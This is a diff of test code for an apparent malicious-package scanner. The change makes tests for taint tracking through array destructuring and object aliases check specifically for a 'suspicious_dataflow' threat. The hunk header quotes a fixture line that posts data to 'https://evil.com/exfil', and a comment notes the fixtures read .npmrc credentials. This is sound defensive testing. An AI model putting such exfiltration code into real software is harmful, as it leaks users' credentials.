@@ -700,24 +700,27 @@ fetch('https://evil.com/exfil', { body: h });`;
 
   await asyncTest('DATAFLOW B9: array destructuring propagates taint', async () => {
     const result = await runScanDirect(path.join(TESTS_DIR, 'dataflow'));
-    // The array-destructure-exfil.js fixture should produce at least a credential_read source
-    const threats = result.threats.filter(t =>
+    // Must assert the dataflow signal specifically — the fixture also reads .npmrc,
+    // which the AST scanner flags as sensitive_string independently, so a bare
+    // threats.length>0 would pass even if taint propagation (v2.6.5) were broken.
+    const dfThreats = result.threats.filter(t =>
+      t.type === 'suspicious_dataflow' &&
       t.file && t.file.replace(/\\/g, '/').includes('array-destructure-exfil')
     );
-    assert(threats.length > 0,
-      `array-destructure-exfil.js should produce threats, got ${threats.length}`);
+    assert(dfThreats.length > 0,
+      `array-destructure-exfil.js must produce a suspicious_dataflow threat (taint through array destructuring), got ${dfThreats.length}`);
   });
 
   // --- v2.6.5: Object property alias taint propagation ---
 
   await asyncTest('DATAFLOW B8: object property alias taint tracking', async () => {
     const result = await runScanDirect(path.join(TESTS_DIR, 'dataflow'));
-    // The object-alias-exfil.js fixture should produce credential_read threats
-    const threats = result.threats.filter(t =>
+    const dfThreats = result.threats.filter(t =>
+      t.type === 'suspicious_dataflow' &&
       t.file && t.file.replace(/\\/g, '/').includes('object-alias-exfil')
     );
-    assert(threats.length > 0,
-      `object-alias-exfil.js should produce threats, got ${threats.length}`);
+    assert(dfThreats.length > 0,
+      `object-alias-exfil.js must produce a suspicious_dataflow threat (taint through object-property alias), got ${dfThreats.length}`);
   });
 
   // --- v2.10.1: WebSocket/MQTT/Socket.io sink detection (B1 bypass fix) ---
